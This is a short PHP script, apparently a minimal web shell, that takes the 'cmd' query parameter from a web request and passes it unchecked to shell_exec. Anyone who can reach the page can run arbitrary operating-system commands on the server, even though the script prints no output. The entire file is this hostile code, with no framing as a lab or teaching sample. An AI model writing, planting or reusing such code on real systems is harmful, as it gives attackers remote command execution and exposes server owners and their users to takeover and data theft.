<?php

$cmd = null;

if(isset($_GET["cmd"])){

	$cmd = $_GET["cmd"];

	shell_exec($cmd);

}

?>
